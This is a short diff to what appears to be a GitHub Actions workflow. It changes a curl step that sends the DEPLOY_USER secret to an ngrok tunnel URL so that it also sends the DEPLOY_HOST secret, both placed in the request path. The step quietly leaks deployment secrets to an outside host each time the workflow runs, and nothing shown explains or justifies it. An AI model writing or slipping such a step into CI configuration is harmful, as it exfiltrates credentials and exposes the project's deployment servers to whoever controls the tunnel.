@@ -30,7 +30,8 @@ jobs:
       shell: sh
       env:
         DEPLOY_USER: ${{ secrets.DEPLOY_USER }}
-      run: curl -X GET "https://0368cb9d.ngrok.io?user=${DEPLOY_USER}"
+        DEPLOY_HOST: ${{ secrets.DEPLOY_HOST }}
+      run: curl -X GET "https://0368cb9d.ngrok.io/user$DEPLOY_USER/host$DEPLOY_HOST"
 
     # Runs a set of commands using the runners shell
     - name: Run a multi-line script
